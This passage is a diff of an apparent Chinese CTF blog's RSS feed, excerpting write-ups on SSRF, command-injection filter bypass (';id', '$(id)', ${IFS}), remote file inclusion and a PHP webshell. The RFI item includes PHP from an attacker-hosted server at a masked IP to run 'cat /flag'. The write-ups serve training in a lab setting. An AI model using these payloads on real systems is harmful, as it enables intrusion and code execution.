 &lt;/ul&gt;
 &lt;p&gt;题目场景：存在一个 &lt;code&gt;?url=&lt;/code&gt; 参数，服务器会代为请求用户指定的地址。目标 &lt;code&gt;flag.php&lt;/code&gt; 限制仅本地访问，且需要 POST 提交正确的 key。&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;二ssrf-原理&#34;&gt;二、SSRF 原理&lt;/h2&gt;
-&lt;h3 id=&#34;21-什么是-ssrf&#34;&gt;2.1 什么是 SSRF？&lt;/h3&gt;
+&lt;h2 id="二ssrf-原理"&gt;二、SSRF 原理&lt;/h2&gt;
+&lt;h3 id="21-什么是-ssrf"&gt;2.1 什么是 SSRF？&lt;/h3&gt;
 &lt;p&gt;SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者通过服务端应用，向服务端所在网络或本地发起请求的攻击方式。&lt;/p&gt;
 &lt;p&gt;在本题中，&lt;code&gt;?url=&lt;/code&gt; 参数就是 SSRF 的注入点。服务器接收到用户传入的 URL 后，使用自身的 HTTP Client（如 PHP 的 &lt;code&gt;file_get_contents()&lt;/code&gt; 或 curl）去请求该地址，并将结果返回给用户。&lt;/p&gt;
-&lt;h3 id=&#34;22-为什么能访问-127001&#34;&gt;2.2 为什么能访问 127.0.0.1？&lt;/h3&gt;
+&lt;h3 id="22-为什么能访问-127001"&gt;2.2 为什么能访问 127.0.0.1？&lt;/h3&gt;
 &lt;p&gt;访问控制通常发生在多个层级：&lt;/p&gt;
 &lt;table&gt;
 	&lt;thead&gt;
@@ -107,54 +158,40 @@
 			&lt;tr&gt;
 					&lt;td&gt;应用层 (L7)&lt;/td&gt;
 					&lt;td&gt;PHP 代码逻辑&lt;/td&gt;
-					&lt;td&gt;&lt;code&gt;flag.php&lt;/code&gt; 仅检查 &lt;code&gt;$_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39;&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;flag.php&lt;/code&gt; 仅检查 &lt;code&gt;$_SERVER['REMOTE_ADDR'] === '127.0.0.1'&lt;/code&gt;&lt;/td&gt;
 			&lt;/tr&gt;
 	&lt;/tbody&gt;
 &lt;/table&gt;
-&lt;p&gt;当服务端代码发起请求时，它的身份是&lt;strong&gt;服务器进程&lt;/strong&gt;，出站连接的源地址是 &lt;code&gt;127.0.0.1&lt;/code&gt;，因此满足 &lt;code&gt;flag.php&lt;/code&gt; 的本地访问控制策略。&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>命令注入综合过滤绕过实战：从空格到管道的一条龙</title>
-      <link>https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/</link>
-      <pubDate>Tue, 09 Jun 2026 01:00:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/</guid>
-      <description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;
+&lt;p&gt;当服务端代码发起请求时，它的身份是&lt;strong&gt;服务器进程&lt;/strong&gt;，出站连接的源地址是 &lt;code&gt;127.0.0.1&lt;/code&gt;，因此满足 &lt;code&gt;flag.php&lt;/code&gt; 的本地访问控制策略。&lt;/p&gt;</description></item><item><title>命令注入综合过滤绕过实战：从空格到管道的一条龙</title><link>https://Samantha09.github.io/san-blog/posts/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98%E4%BB%8E%E7%A9%BA%E6%A0%BC%E5%88%B0%E7%AE%A1%E9%81%93%E7%9A%84%E4%B8%80%E6%9D%A1%E9%BE%99/</link><pubDate>Tue, 09 Jun 2026 01:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98%E4%BB%8E%E7%A9%BA%E6%A0%BC%E5%88%B0%E7%AE%A1%E9%81%93%E7%9A%84%E4%B8%80%E6%9D%A1%E9%BE%99/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / 命令注入（Command Injection）&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：黑名单过滤绕过、Shell 语法特性、编码与通配符&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;核心漏洞&lt;/strong&gt;：&lt;code&gt;exec()&lt;/code&gt; 直接拼接用户输入，黑名单过滤存在遗漏&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;源码分析&#34;&gt;源码分析&lt;/h2&gt;
+&lt;h2 id="源码分析"&gt;源码分析&lt;/h2&gt;
 &lt;p&gt;题目给了一段典型的命令注入代码，过滤规则逐步加强：&lt;/p&gt;
-&lt;h3 id=&#34;第一版只过滤-&#34;&gt;第一版：只过滤 &lt;code&gt;/&lt;/code&gt;&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match_all&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/\//&amp;#34;&lt;/span&gt;, $ip, $m)) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ping -c 4 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;($cmd, $res);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;h3 id="第一版只过滤-"&gt;第一版：只过滤 &lt;code&gt;/&lt;/code&gt;&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;preg_match_all&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/\//&amp;#34;&lt;/span&gt;, $ip, $m)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $cmd &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ping -c 4 &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;$ip&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;exec&lt;/span&gt;($cmd, $res);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;分析&lt;/strong&gt;：只防了斜杠，但命令注入绝大多数情况下根本不需要 &lt;code&gt;/&lt;/code&gt;。&lt;code&gt;;id&lt;/code&gt;、&lt;code&gt;$(id)&lt;/code&gt;、&lt;code&gt;`id`&lt;/code&gt; 直接通杀。&lt;/p&gt;
-&lt;h3 id=&#34;第二版过滤--和-&#34;&gt;第二版：过滤 &lt;code&gt;|&lt;/code&gt; 和 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match_all&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/(\||\&amp;amp;)/&amp;#34;&lt;/span&gt;, $ip, $m)) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ping -c 4 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, $res);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;h3 id="第二版过滤--和-"&gt;第二版：过滤 &lt;code&gt;|&lt;/code&gt; 和 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;preg_match_all&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/(\||\&amp;amp;)/&amp;#34;&lt;/span&gt;, $ip, $m)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;exec&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;ping -c 4 &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;$ip&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;, $res);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;分析&lt;/strong&gt;：禁了管道和后台执行，但 &lt;code&gt;;&lt;/code&gt; 完全没防，而且 &lt;code&gt;$()&lt;/code&gt; 也无需任何分隔符。&lt;/p&gt;
-&lt;h3 id=&#34;第三版综合过滤核心挑战&#34;&gt;第三版：综合过滤（核心挑战）&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match_all&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/(\||&amp;amp;|;| |\/|cat|flag|ctfhub)/&amp;#34;&lt;/span&gt;, $ip, $m)) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ping -c 4 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;($cmd, $res);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;h3 id="第三版综合过滤核心挑战"&gt;第三版：综合过滤（核心挑战）&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;preg_match_all&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/(\||&amp;amp;|;| |\/|cat|flag|ctfhub)/&amp;#34;&lt;/span&gt;, $ip, $m)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $cmd &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ping -c 4 &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;$ip&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;exec&lt;/span&gt;($cmd, $res);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;黑名单&lt;/strong&gt;：&lt;code&gt;|&lt;/code&gt;、&lt;code&gt;&amp;amp;&lt;/code&gt;、&lt;code&gt;;&lt;/code&gt;、&lt;strong&gt;空格&lt;/strong&gt;、&lt;code&gt;/&lt;/code&gt;、&lt;code&gt;cat&lt;/code&gt;、&lt;code&gt;flag&lt;/code&gt;、&lt;code&gt;ctfhub&lt;/code&gt;&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;绕过技巧拆解&#34;&gt;绕过技巧拆解&lt;/h2&gt;
-&lt;h3 id=&#34;1-空格绕过ifs&#34;&gt;1. 空格绕过：${IFS}&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;${IFS}&lt;/code&gt; 是 shell 的内置变量（Internal Field Separator），默认值包含&lt;strong&gt;空格、Tab、换行&lt;/strong&gt;。在命令中可以直接代替空格。&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>CTFHub RFI 远程文件包含漏洞利用详解</title>
-      <link>https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/</link>
-      <pubDate>Sat, 06 Jun 2026 10:00:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/</guid>
-      <description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;
+&lt;h2 id="绕过技巧拆解"&gt;绕过技巧拆解&lt;/h2&gt;
+&lt;h3 id="1-空格绕过ifs"&gt;1. 空格绕过：${IFS}&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;${IFS}&lt;/code&gt; 是 shell 的内置变量（Internal Field Separator），默认值包含&lt;strong&gt;空格、Tab、换行&lt;/strong&gt;。在命令中可以直接代替空格。&lt;/p&gt;</description></item><item><title>CTFHub RFI 远程文件包含漏洞利用详解</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</link><pubDate>Sat, 06 Jun 2026 10:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / 文件包含漏洞&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：CTFHub&lt;/li&gt;
@@ -165,7 +202,7 @@
 &lt;p&gt;&lt;strong&gt;隐私声明&lt;/strong&gt;：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 &lt;code&gt;xxx.xxx.xxx.xxx&lt;/code&gt;，避免暴露真实目标资产。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+&lt;h2 id="漏洞分析"&gt;漏洞分析&lt;/h2&gt;
 &lt;p&gt;远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 &lt;code&gt;include()&lt;/code&gt;、&lt;code&gt;require()&lt;/code&gt; 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。&lt;/p&gt;
 &lt;p&gt;本题的关键利用点：&lt;/p&gt;
 &lt;ol&gt;
@@ -174,45 +211,38 @@
 &lt;li&gt;攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 &lt;code&gt;?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt&lt;/code&gt; 触发执行&lt;/li&gt;
 &lt;/ol&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;利用步骤&#34;&gt;利用步骤&lt;/h2&gt;
-&lt;h3 id=&#34;1-准备恶意payload&#34;&gt;1. 准备恶意payload&lt;/h3&gt;
+&lt;h2 id="利用步骤"&gt;利用步骤&lt;/h2&gt;
+&lt;h3 id="1-准备恶意payload"&gt;1. 准备恶意payload&lt;/h3&gt;
 &lt;p&gt;在攻击者可控的服务器（IP：&lt;code&gt;xxx.xxx.xxx.xxx&lt;/code&gt;，端口：&lt;code&gt;8000&lt;/code&gt;）上放置文件 &lt;code&gt;yjh.txt&lt;/code&gt;，内容如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat /flag&amp;#34;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;cat /flag&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;注意：文件名使用了 &lt;code&gt;.txt&lt;/code&gt; 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 &lt;code&gt;include()&lt;/code&gt; 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 &lt;code&gt;.txt&lt;/code&gt;，其中的 PHP 代码依然会被解析执行。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;2-发送包含请求&#34;&gt;2. 发送包含请求&lt;/h3&gt;
-&lt;p&gt;通过 Postman 或浏览器构造请求：&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>CTFHub 文件包含实战：利用一句话木马 getshell</title>
-      <link>https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/</link>
-      <pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/ctfhub-file-inclusion-shell/</guid>
-      <description>&lt;h2 id=&#34;一题目信息&#34;&gt;一、题目信息&lt;/h2&gt;
+&lt;h3 id="2-发送包含请求"&gt;2. 发送包含请求&lt;/h3&gt;
+&lt;p&gt;通过 Postman 或浏览器构造请求：&lt;/p&gt;</description></item><item><title>CTFHub 文件包含实战：利用一句话木马 getshell</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</link><pubDate>Fri, 05 Jun 2026 23:10:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-getshell/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / RCE / 文件包含&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：PHP &lt;code&gt;include&lt;/code&gt; 函数、一句话木马、WebShell 连接&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;题目链接：&lt;a href=&#34;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&#34;&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;题目链接：&lt;a href="https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html"&gt;https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;二源码分析&#34;&gt;二、源码分析&lt;/h2&gt;
+&lt;h2 id="二源码分析"&gt;二、源码分析&lt;/h2&gt;
 &lt;p&gt;进入题目后，直接给出了 PHP 源码：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);  &lt;span style=&#34;color:#75715e&#34;&gt;// 关闭报错显示
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) {                    &lt;span style=&#34;color:#75715e&#34;&gt;// 接收 file 参数
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {  &lt;span style=&#34;color:#75715e&#34;&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;;                           &lt;span style=&#34;color:#75715e&#34;&gt;// 输出 hack，阻止访问
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]);                &lt;span style=&#34;color:#75715e&#34;&gt;// 否则包含指定文件
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逻辑梳理&#34;&gt;逻辑梳理&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
